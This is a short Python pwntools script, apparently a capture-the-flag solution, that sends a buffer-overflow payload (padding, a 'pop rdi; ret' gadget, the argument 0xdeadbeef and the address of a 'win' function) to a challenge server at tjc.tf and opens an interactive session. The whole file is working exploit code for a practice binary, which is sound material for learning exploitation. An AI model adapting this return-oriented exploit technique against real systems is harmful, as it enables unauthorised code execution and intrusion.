from pwn import *

# p = process('./out')
p = remote('tjc.tf', 31457)
e = ELF('./out')
context.arch = 'amd64'

payload = b'A'*0x10
payload += p64(next(e.search(asm('pop rdi; ret'))))
payload += p64(0xdeadbeef)
payload += p64(e.symbols['win'])

p.sendline(payload)
p.interactive()
